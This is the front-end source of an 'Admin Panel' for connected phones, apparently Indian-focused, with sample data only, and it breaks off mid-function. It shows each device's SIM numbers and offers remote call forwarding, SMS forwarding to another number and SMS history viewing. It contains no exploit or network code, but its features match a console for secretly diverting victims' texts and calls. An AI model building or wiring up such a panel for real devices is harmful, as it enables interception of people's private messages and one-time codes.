<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Connected Devices</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* Header Styles */
        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
            padding: 25px 20px;
            background: #1e1e1e;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            border: 1px solid #333;
        }
        
        .admin-title {
            font-size: 36px;
            font-weight: 700;
            color: #ff4444;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 15px rgba(255, 68, 68, 0.7);
        }
        
        /* Devices Grid */
        .devices-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .device-card {
            background: #1e1e1e;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            border: 1px solid #333;
            transition: all 0.3s ease;
            position: relative;
            cursor: pointer;
        }
        
        .device-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
            border-color: #ff4444;
        }
        
        .device-card.connected {
            border-left: 5px solid #4CAF50;
        }
        
        .device-card.disconnected {
            border-left: 5px solid #ff4444;
        }
        
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .device-model {
            font-size: 18px;
            font-weight: 600;
            color: #4CAF50;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .device-status {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .status-connected {
            background-color: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            border: 1px solid #4CAF50;
        }
        
        .status-disconnected {
            background-color: rgba(255, 68, 68, 0.2);
            color: #ff4444;
            border: 1px solid #ff4444;
        }
        
        /* SIM Information */
        .sim-section {
            margin-bottom: 15px;
        }
        
        .section-title {
            font-size: 14px;
            color: #888;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .sim-cards {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .sim-card {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px;
            background: #2a2a2a;
            border-radius: 8px;
            border-left: 3px solid #4CAF50;
        }
        
        .sim-card.inactive {
            border-left-color: #666;
            opacity: 0.7;
        }
        
        .sim-icon {
            width: 30px;
            height: 30px;
            border-radius: 6px;
            background: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #4CAF50;
        }
        
        .sim-info {
            flex: 1;
        }
        
        .sim-number {
            font-weight: 500;
            font-size: 14px;
        }
        
        .sim-operator {
            font-size: 12px;
            color: #888;
        }
        
        /* Phone Details */
        .phone-details {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .detail-item {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px;
            background: #2a2a2a;
            border-radius: 6px;
            font-size: 13px;
        }
        
        .detail-item i {
            color: #4CAF50;
            width: 16px;
        }
        
        /* Connection Info */
        .connection-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding: 10px;
            background: #2a2a2a;
            border-radius: 8px;
            font-size: 13px;
        }
        
        .connection-time, .last-active {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        
        .time-label {
            font-size: 11px;
            color: #888;
        }
        
        .time-value {
            font-weight: 500;
        }
        
        /* Action Buttons */
        .action-buttons {
            display: flex;
            gap: 8px;
            justify-content: flex-end;
        }
        
        .action-btn {
            background: #333;
            border: none;
            color: #e0e0e0;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.3s ease;
            font-size: 13px;
        }
        
        .action-btn:hover {
            background: #ff4444;
            color: white;
            transform: translateY(-2px);
        }
        
        .action-btn.delete:hover {
            background: #cc0000;
        }
        
        /* Controls */
        .controls {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        
        .btn {
            background: #ff4444;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
            font-weight: 500;
            font-size: 15px;
        }
        
        .btn:hover {
            background: #cc0000;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 68, 68, 0.3);
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 14px;
            margin-top: 30px;
            border-top: 1px solid #333;
        }
        
        /* Empty State */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #666;
        }
        
        .empty-state i {
            font-size: 64px;
            color: #333;
            margin-bottom: 20px;
        }
        
        .empty-state p {
            font-size: 18px;
            margin-bottom: 20px;
        }
        
        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: #1e1e1e;
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 800px;
            border: 2px solid #ff4444;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            max-height: 90vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .modal-title {
            font-size: 22px;
            color: #ff4444;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: #e0e0e0;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
        }
        
        .close-btn:hover {
            color: #ff4444;
        }
        
        .tab-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .tab-btn {
            flex: 1;
            padding: 12px;
            background: #2a2a2a;
            border: none;
            color: #e0e0e0;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
        }
        
        .tab-btn.active {
            background: #ff4444;
            color: white;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #e0e0e0;
            font-weight: 500;
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            background: #2a2a2a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #ff4444;
        }
        
        .save-btn {
            width: 100%;
            padding: 12px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 500;
            font-size: 16px;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        
        .save-btn:hover {
            background: #45a049;
            transform: translateY(-2px);
        }
        
        /* Call Forward Settings */
        .call-forward-section {
            background: #2a2a2a;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 4px solid #2196F3;
        }
        
        .call-forward-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .call-forward-title {
            font-size: 16px;
            font-weight: 600;
            color: #2196F3;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }
        
        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #666;
            transition: .4s;
            border-radius: 24px;
        }
        
        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 16px;
            width: 16px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        input:checked + .toggle-slider {
            background-color: #4CAF50;
        }
        
        input:checked + .toggle-slider:before {
            transform: translateX(26px);
        }
        
        .call-forward-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 15px;
        }
        
        .forward-option {
            background: #333;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #444;
        }
        
        .forward-option.active {
            border-color: #4CAF50;
            background: rgba(76, 175, 80, 0.1);
        }
        
        .option-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .option-title {
            font-weight: 500;
            color: #e0e0e0;
        }
        
        .option-status {
            font-size: 12px;
            padding: 4px 8px;
            border-radius: 12px;
            background: #444;
            color: #888;
        }
        
        .option-status.active {
            background: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
        }
        
        .forward-number {
            font-size: 13px;
            color: #888;
            margin-top: 5px;
        }
        
        /* SMS List Styles */
        .sms-controls {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .sms-search {
            flex: 1;
        }
        
        .sms-filter {
            width: 150px;
        }
        
        .sms-list {
            max-height: 400px;
            overflow-y: auto;
            background: #2a2a2a;
            border-radius: 8px;
            padding: 10px;
        }
        
        .sms-item {
            padding: 15px;
            background: #333;
            border-radius: 8px;
            margin-bottom: 10px;
            border-left: 4px solid #2196F3;
            transition: all 0.3s ease;
        }
        
        .sms-item:hover {
            background: #3a3a3a;
            transform: translateX(5px);
        }
        
        .sms-item.sent {
            border-left-color: #4CAF50;
        }
        
        .sms-item.received {
            border-left-color: #FF9800;
        }
        
        .sms-item.failed {
            border-left-color: #f44336;
        }
        
        .sms-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        
        .sms-number {
            font-weight: 600;
            color: #e0e0e0;
        }
        
        .sms-type {
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
        }
        
        .sms-type.sent {
            background: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
        }
        
        .sms-type.received {
            background: rgba(255, 152, 0, 0.2);
            color: #FF9800;
        }
        
        .sms-type.failed {
            background: rgba(244, 67, 54, 0.2);
            color: #f44336;
        }
        
        .sms-body {
            color: #e0e0e0;
            margin-bottom: 8px;
            line-height: 1.4;
        }
        
        .sms-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 11px;
            color: #888;
        }
        
        .sms-sim {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        
        .sms-date {
            font-size: 11px;
        }
        
        .no-sms {
            text-align: center;
            padding: 40px 20px;
            color: #888;
        }
        
        .no-sms i {
            font-size: 48px;
            margin-bottom: 15px;
            color: #444;
        }
        
        /* Add Customer Modal */
        .add-customer-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }
        
        .add-customer-content {
            background: #1e1e1e;
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            border: 2px solid #2196F3;
        }
        
        .form-row {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .form-row .form-group {
            flex: 1;
            margin-bottom: 0;
        }
        
        /* Responsive Styles */
        @media (max-width: 768px) {
            .header {
                padding: 20px 15px;
            }
            
            .admin-title {
                font-size: 28px;
                letter-spacing: 2px;
            }
            
            .devices-grid {
                grid-template-columns: 1fr;
            }
            
            .controls {
                flex-direction: column;
                align-items: center;
            }
            
            .btn {
                width: 200px;
                justify-content: center;
            }
            
            .modal-content {
                width: 95%;
                padding: 20px;
            }
            
            .form-row {
                flex-direction: column;
                gap: 15px;
            }
            
            .sms-controls {
                flex-direction: column;
            }
            
            .sms-filter {
                width: 100%;
            }
            
            .call-forward-options {
                grid-template-columns: 1fr;
            }
        }
        
        /* Animation for new devices */
        @keyframes highlight {
            0% { 
                background-color: rgba(76, 175, 80, 0.3);
                transform: scale(1.05);
            }
            100% { 
                background-color: transparent;
                transform: scale(1);
            }
        }
        
        .highlight {
            animation: highlight 2s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="admin-title">
                ADMIN PANEL
            </div>
        </div>
        
        <!-- Controls -->
        <div class="controls">
            <button class="btn" id="refresh-devices">
                <i class="fas fa-sync-alt"></i> Refresh Devices
            </button>
        </div>
        
        <!-- Devices Grid -->
        <div class="devices-grid" id="devices-grid">
            <!-- Devices will be populated by JavaScript -->
        </div>
        
        <!-- Empty State -->
        <div id="empty-state" class="empty-state" style="display: none;">
            <i class="fas fa-mobile-alt"></i>
            <p>No devices connected</p>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <p>Admin Panel &copy; 2023 | All connected devices are displayed here</p>
        </div>
    </div>

    <!-- Client Settings Modal -->
    <div class="modal" id="client-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">
                    <i class="fas fa-cog"></i>
                    <span id="modal-device-name">Device Settings</span>
                </h2>
                <button class="close-btn" id="close-modal">&times;</button>
            </div>
            
            <div class="tab-buttons">
                <button class="tab-btn active" data-tab="call-forward">Call Forward</button>
                <button class="tab-btn" data-tab="sms-settings">SMS Forward</button>
                <button class="tab-btn" data-tab="customer-data">Customer Data</button>
                <button class="tab-btn" data-tab="sms-history">SMS History</button>
            </div>
            
            <!-- Call Forward Settings Tab -->
            <div class="tab-content active" id="call-forward">
                <div class="call-forward-section">
                    <div class="call-forward-header">
                        <div class="call-forward-title">
                            <i class="fas fa-phone"></i>
                            Call Forward Settings
                        </div>
                        <label class="toggle-switch">
                            <input type="checkbox" id="enable-call-forwarding" checked>
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                    
                    <div class="call-forward-options">
                        <div class="forward-option active" id="sim1-forward">
                            <div class="option-header">
                                <div class="option-title">SIM 1 Forwarding</div>
                                <div class="option-status active">Active</div>
                            </div>
                            <div class="form-group">
                                <label class="form-label">Forward Calls to</label>
                                <input type="text" class="form-input" id="sim1-forward-number" placeholder="+91 98765 43210">
                            </div>
                            <div class="forward-number">Current: <span id="sim1-current-number">+91 98765 43210</span></div>
                        </div>
                        
                        <div class="forward-option" id="sim2-forward">
                            <div class="option-header">
                                <div class="option-title">SIM 2 Forwarding</div>
                                <div class="option-status">Inactive</div>
                            </div>
                            <div class="form-group">
                                <label class="form-label">Forward Calls to</label>
                                <input type="text" class="form-input" id="sim2-forward-number" placeholder="+91 87654 32109">
                            </div>
                            <div class="forward-number">Current: <span id="sim2-current-number">+91 87654 32109</span></div>
                        </div>
                    </div>
                </div>
                
                <button class="save-btn" id="save-call-settings">
                    <i class="fas fa-save"></i> Save Call Forward Settings
                </button>
            </div>
            
            <!-- SMS Forward Settings Tab -->
            <div class="tab-content" id="sms-settings">
                <div class="form-group">
                    <label class="form-label">Forward SMS to Number</label>
                    <input type="text" class="form-input" id="forward-number" placeholder="+91 98765 43210">
                </div>
                
                <div class="form-group">
                    <label class="form-label">Select SIM for Forwarding</label>
                    <select class="form-input" id="sim-select">
                        <option value="sim1">SIM 1</option>
                        <option value="sim2">SIM 2</option>
                        <option value="both">Both SIMs</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label class="form-label">
                        <input type="checkbox" id="enable-forwarding" checked>
                        Enable SMS Forwarding
                    </label>
                </div>
                
                <button class="save-btn" id="save-sms-settings">
                    <i class="fas fa-save"></i> Save SMS Settings
                </button>
            </div>
            
            <!-- Customer Data Tab -->
            <div class="tab-content" id="customer-data">
                <button class="btn" id="add-customer-btn" style="margin-bottom: 15px;">
                    <i class="fas fa-plus"></i> Add New Customer
                </button>
                
                <div class="form-group">
                    <label class="form-label">Search Customer</label>
                    <input type="text" class="form-input" id="search-customer" placeholder="Enter customer name, phone or email">
                </div>
                
                <div class="customer-list" id="customer-list">
                    <!-- Customer data will be populated here -->
                </div>
            </div>
            
            <!-- SMS History Tab -->
            <div class="tab-content" id="sms-history">
                <div class="sms-controls">
                    <div class="form-group sms-search">
                        <input type="text" class="form-input" id="search-sms" placeholder="Search SMS...">
                    </div>
                    <div class="form-group sms-filter">
                        <select class="form-input" id="sms-type-filter">
                            <option value="all">All SMS</option>
                            <option value="sent">Sent</option>
                            <option value="received">Received</option>
                            <option value="failed">Failed</option>
                        </select>
                    </div>
                </div>
                
                <div class="sms-list" id="sms-list">
                    <!-- SMS data will be populated here -->
                </div>
            </div>
        </div>
    </div>

    <!-- Add Customer Modal -->
    <div class="add-customer-modal" id="add-customer-modal">
        <div class="add-customer-content">
            <div class="modal-header">
                <h2 class="modal-title">
                    <i class="fas fa-user-plus"></i>
                    Add New Customer
                </h2>
                <button class="close-btn" id="close-add-customer-modal">&times;</button>
            </div>
            
            <div class="form-group">
                <label class="form-label">Customer Name *</label>
                <input type="text" class="form-input" id="customer-name" placeholder="Enter customer name">
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label class="form-label">Phone Number *</label>
                    <input type="text" class="form-input" id="customer-phone" placeholder="+91 98765 43210">
                </div>
                <div class="form-group">
                    <label class="form-label">Email Address</label>
                    <input type="email" class="form-input" id="customer-email" placeholder="customer@email.com">
                </div>
            </div>
            
            <div class="form-group">
                <label class="form-label">Address</label>
                <textarea class="form-input" id="customer-address" placeholder="Enter customer address" rows="3"></textarea>
            </div>
            
            <div class="form-group">
                <label class="form-label">Additional Notes</label>
                <textarea class="form-input" id="customer-notes" placeholder="Any additional information" rows="3"></textarea>
            </div>
            
            <button class="save-btn" id="save-customer">
                <i class="fas fa-save"></i> Save Customer
            </button>
        </div>
    </div>

    <script>
        // Sample data for connected devices with detailed information
        let devices = [
            {
                model: "Samsung Galaxy S21",
                brand: "Samsung",
                androidVersion: "Android 12",
                battery: "4000mAh",
                dualSim: true,
                sim1: {
                    number: "+91 98765 43210",
                    operator: "Jio",
                    status: "active"
                },
                sim2: {
                    number: "+91 87654 32109",
                    operator: "Airtel",
                    status: "active"
                },
                connectionTime: "2023-10-15 09:30:25",
                lastActive: "2 minutes ago",
                status: "connected",
                callForwardSettings: {
                    enabled: true,
                    sim1: {
                        enabled: true,
                        forwardNumber: "+91 99999 88888"
                    },
                    sim2: {
                        enabled: false,
                        forwardNumber: "+91 88888 77777"
                    }
                },
                smsSettings: {
                    forwardNumber: "+91 99999 88888",
                    selectedSim: "sim1",
                    enabled: true
                },
                customers: [
                    { 
                        id: 1,
                        name: "Rahul Sharma", 
                        phone: "+91 98765 43210", 
                        email: "rahul@email.com",
                        address: "Mumbai, Maharashtra",
                        notes: "Regular customer",
                        addedDate: "2023-10-10"
                    }
                ],
                smsHistory: [
                    {
                        id: 1,
                        type: "received",
                        number: "+91 98765 43210",
                        message: "Hello, I'm interested in your product. Please send me more details.",
                        timestamp: "2023-10-15 14:30:25",
                        sim: "sim1",
                        status: "delivered"
                    },
                    {
                        id: 2,
                        type: "sent",
                        number: "+91 98765 43210",
                        message: "Thank you for your interest! Here are the product details...",
                        timestamp: "2023-10-15 14:32:10",
                        sim: "sim1",
                        status: "delivered"
                    }
                ]
            },
            {
                model: "iPhone 13 Pro",
                brand: "Apple",
                androidVersion: "iOS 15",
                battery: "3095mAh",
                dualSim: true,
                sim1: {
                    number: "+91 76543 21098",
                    operator: "Vi",
                    status: "active"
                },
                sim2: {
                    number: "Not Inserted",
                    operator: "N/A",
                    status: "inactive"
                },
                connectionTime: "2023-10-15 10:15:42",
                lastActive: "5 minutes ago",
                status: "connected",
                callForwardSettings: {
                    enabled: false,
                    sim1: {
                        enabled: false,
                        forwardNumber: "+91 77777 66666"
                    },
                    sim2: {
                        enabled: false,
                        forwardNumber: ""
                    }
                },
                smsSettings: {
                    forwardNumber: "+91 88888 77777",
                    selectedSim: "sim1",
                    enabled: false
                },
                customers: [
                    { 
                        id: 1,
                        name: "Neha Gupta", 
                        phone: "+91 65432 10987", 
                        email: "neha@email.com",
                        address: "Bangalore, Karnataka",
                        notes: "New customer",
                        addedDate: "2023-10-14"
                    }
                ],
                smsHistory: [
                    {
                        id: 1,
                        type: "received",
                        number: "+91 65432 10987",
                        message: "Hi, when will my order be delivered?",
                        timestamp: "2023-10-15 13:20:15",
                        sim: "sim1",
                        status: "delivered"
                    }
                ]
            }
        ];

        let currentDeviceIndex = -1;
        let nextCustomerId = 100;
        let nextSmsId = 100;

        // Function to populate devices grid
        function populateDevicesGrid() {
            const devicesGrid = document.getElementById('devices-grid');
            const emptyState = document.getElementById('empty-state');
            
            devicesGrid.innerHTML = '';
            
            if (devices.length === 0) {
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            devices.forEach((device, index) => {
                const card = document.createElement('div');
                card.className = `device-card ${device.status}`;
                card.onclick = () => openClientModal(index);
                
                // SIM Information HTML
                const simInfoHTML = `
                    <div class="sim-section">
                        <div class="section-title">
                            <i class="fas fa-sim-card"></i>
                            SIM Cards
                        </div>
                        <div class="sim-cards">
                            <div class="sim-card ${device.sim1.status === 'active' ? '' : 'inactive'}">
                                <div class="sim-icon">
                                    <i class="fas fa-sim-card"></i>
                                </div>
                                <div class="sim-info">
                                    <div class="sim-number">${device.sim1.number}</div>
                                    <div class="sim-operator">${device.sim1.operator}</div>
                                </div>
                            </div>
                            <div class="sim-card ${device.sim2.status === 'active' ? '' : 'inactive'}">
                                <div class="sim-icon">
                                    <i class="fas fa-sim-card"></i>
                                </div>
                                <div class="sim-info">
                                    <div class="sim-number">${device.sim2.number}</div>
                                    <div class="sim-operator">${device.sim2.operator}</div>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
                
                // Phone Details HTML
                const phoneDetailsHTML = `
                    <div class="phone-details">
                        <div class="detail-item">
                            <i class="fas fa-mobile"></i>
                            <span>${device.brand}</span>
                        </div>
                        <div class="detail-item">
                            <i class="fas fa-battery-three-quarters"></i>
                            <span>${device.battery}</span>
                        </div>
                        <div class="detail-item">
                            <i class="fab fa-android"></i>
                            <span>${device.androidVersion}</span>
                        </div>
                    </div>
                `;
                
                card.innerHTML = `
                    <div class="device-header">
                        <div class="device-model">
                            <i class="fas fa-mobile-alt"></i>
                            ${device.model}
                        </div>
                        <span class="device-status status-${device.status}">
                            <i class="fas ${device.status === 'connected' ? 'fa-check-circle' : 'fa-times-circle'}"></i>
                            ${device.status === 'connected' ? 'Connected' : 'Disconnected'}
                        </span>
                    </div>
                    
                    ${simInfoHTML}
                    
                    ${phoneDetailsHTML}
                    
                    <div class="connection-info">
                        <div class="connection-time">
                            <div class="time-label">Connected</div>
                            <div class="time-value">${device.connectionTime}</div>
                        </div>
                        <div class="last-active">
                            <div class="time-label">Last Active</div>
                            <div class="time-value">${device.lastActive}</div>
                        </div>
                    </div>
                    
                    <div class="action-buttons">
                        <button class="action-btn" title="Send Test SMS" onclick="event.stopPropagation(); sendTestSMS(${index})">
                            <i class="fas fa-paper-plane"></i>
                            SMS
                        </button>
                        <button class="action-btn" title="Disconnect" onclick="event.stopPropagation(); disconnectDevice(${index})">
                            <i class="fas fa-power-off"></i>
                            Disconnect
                        </button>
                        <button class="action-btn delete" title="Remove" onclick="event.stopPropagation(); removeDevice(${index})">
                            <i class="fas fa-trash"></i>
                            Remove
                        </button>
                    </div>
                `;
                
                devicesGrid.appendChild(card);
            });
        }

        // Function to open client modal
        function openClientModal(deviceIndex) {
            currentDeviceIndex = deviceIndex;
            const device = devices[deviceIndex];
            const modal = document.getElementById('client-modal');
            const modalTitle = document.getElementById('modal-device-name');
            
            modalTitle.textContent = `${device.model} - Settings`;
            
            // Load Call Forward settings
            loadCallForwardSettings(device);
            
            // Load SMS settings
            document.getElementById('forward-number').value = device.smsSettings.forwardNumber;
            document.getElementById('sim-select').value = device.smsSettings.selectedSim;
            document.getElementById('enable-forwarding').checked = device.smsSettings.enabled;
            
            // Load customer data
            populateCustomerList(device.customers);
            
            // Load SMS history
            populateSmsList(device.smsHistory);
            
            modal.style.display = 'flex';
        }

        // Function to load call forward settings
        function loadCallForwardSettings(device) {
            const callSettings = device.callForwardSettings;
            
            // Main toggle
            document.getElementById('enable-call-forwarding').checked = callSettings.enabled;
            
            // SIM 1 settings
            document.getElementById('sim1-forward-number').value = callSettings.sim1.forwardNumber;
            document.getElementById('sim1-current-number').textContent = callSettings.sim1.forwardNumber;
            
            // SIM 2 settings
            document.getElementById('sim2-forward-number').value = callSettings.sim2.forwardNumber;
            document.getElementById('sim2-current-number').textContent = callSettings.sim2.forwardNumber;
            
            // Update SIM card status
            updateSimCardStatus('sim1', callSettings.sim1.enabled);
            updateSimCardStatus('sim2', callSettings.sim2.enabled);
        }

        // Function to update SIM card status display
        function updateSimCardStatus(simId, isEnabled) {
            const simElement = document.getElementById(`${simId}-forward`);
            const statusElement = simElement.querySelector('.option-status');
            
            if (isEnabled) {
                simElement.classList.add('active');
                statusElement.classList.add('active');
                statusElement.textContent = 'Active';
            } else {
                simElement.classList.remove('active');
                statusElement.classList.remove('active');
                statusElement.textContent = 'Inactive';
            }
        }

        // Function to populate customer list
        function populateCustomerList(customers) {
            const customerList = document.getElementById('customer-list');
            customerList.innerHTML = '';
            
            if (customers.length === 0) {
                customerList.innerHTML = '<div style="text-align: center; color: #888; padding: 20px;">No customer data available. Click "Add New Customer" to add customers.</div>';
                return;
            }
            
            customers.forEach(customer => {
                const customerItem = document.createElement('div');
                customerItem.className = 'customer-item';
                customerItem.innerHTML = `
                    <div class="customer-info">
                        <div class="customer-name">${customer.name}</div>
                        <div class="customer-phone">üìû ${customer.phone}</div>
                        ${customer.email ? `<div class="customer-email">üìß ${customer.email}</div>` : ''}
                        ${customer.address ? `<div class="customer-email">üè† ${customer.address}</div>` : ''}
                        ${customer.notes ? `<div class="customer-email">üìù ${customer.notes}</div>` : ''}
                        <div class="customer-email" style="font-size: 11px; color: #666;">Added: ${customer.addedDate}</div>
                    </div>
                    <div class="customer-actions">
                        <button class="customer-action-btn delete-btn" title="Delete Customer" onclick="deleteCustomer(${customer.id})">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                `;
                customerList.appendChild(customerItem);
            });
        }

        // Function to populate SMS list
        function populateSmsList(smsList) {
            const smsContainer = document.getElementById('sms-list');
            smsContainer.innerHTML = '';
            
            if (smsList.length === 0) {
                smsContainer.innerHTML = `
                    <div class="no-sms">
                        <i class="fas fa-comment-slash"></i>
                        <p>No SMS messages found</p>
                    </div>
                `;
                return;
            }
            
            // Sort SMS by timestamp (newest first)
            const sortedSms = [...smsList].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            sortedSms.forEach(sms => {
                const smsItem = document.createElement('div');
                smsItem.className = `sms-item ${sms.type}`;
                
                const typeText = sms.type === 'sent' ? 'Sent' : sms.type === 'received' ? 'Received' : 'Failed';
                const simText = sms.sim === 'sim1' ? 'SIM 1' : 'SIM 2';
                
                smsItem.innerHTML = `
                    <div class="sms-header">
                        <div class="sms-number">${sms.number}</div>
                        <span class="sms-type ${sms.type}">${typeText}</span>
                    </div>
                    <div class="sms-body">${sms.message}</div>
                    <div class="sms-footer">
                        <div class="sms-sim">
                            <i class="fas fa-sim-card"></i>
                            ${simText}
                        </div>
                        <div class="sms-date">${sms.timestamp}</div>
                    </div>
                `;
                
                smsContainer.appendChild(smsItem);
            });
        }

        // Function to add new customer
        function addNewCustomer() {
            const name = document.getElementById('customer-name').value.trim();
            const phone = document.getElementById('customer-phone').value.trim();
            const email = document.getElementById('customer-email').value.trim();
            const address = document.getElementById('customer-address').value.trim();
            const notes = document.getElementById('customer-notes').value.trim();
            
            if (!name || !phone) {
                showNotification("Customer name and phone are required!");
                return;
            }
            
            if (currentDeviceIndex !== -1) {
                const device = devices[currentDeviceIndex];
                const newCustomer = {
                    id: nextCustomerId++,
                    name: name,
                    phone: phone,
                    email: email,
                    address: address,
                    notes: notes,
                    addedDate: new Date().toLocaleDateString('en-IN')
                };
                
                device.customers.push(newCustomer);
                populateCustomerList(device.customers);
                
                // Clear form
                document.getElementById('customer-name').value = '';
                document.getElementById('customer-phone').value = '';
                document.getElementById('customer-email').value = '';
                document.getElementById('customer-address').value = '';
                document.getElementById('customer-notes').value = '';
                
                // Close modal
                document.getElementById('add-customer-modal').style.display = 'none';
                
                showNotification(`Customer ${name} added successfully!`);
            }
        }

        // Function to delete customer
        function deleteCustomer(customerId) {
            if (confirm("Kya aap is customer ko delete karna chahte hain?")) {
                if (currentDeviceIndex !== -1) {
                    const device = devices[currentDeviceIndex];
                    const customerIndex = device.customers.findIndex(c => c.id === customerId);
                    
                    if (customerIndex !== -1) {
                        const deletedCustomer = device.customers.splice(customerIndex, 1)[0];
                        populateCustomerList(device.customers);
                        showNotification(`Customer ${deletedCustomer.name} deleted successfully!`);
                    }
                }
            }
        }

        // Function to send test SMS
        function sendTestSMS(deviceIndex) {
            const device = devices[deviceIndex];
            if (device) {
                // Add test SMS to history
                const newSms = {
                    id: nextSmsId++,
                    type: "sent",
                    number: "+91 99999 99999",
                    message: "This is a test SMS message from admin panel",
                    timestamp: new Date().toLocaleString('en-IN'),
                    sim: "sim1",
                    status: "delivered"
                };
                
                device.smsHistory.push(newSms);
                showNotification(`Test SMS sent from ${device.model}`);
                
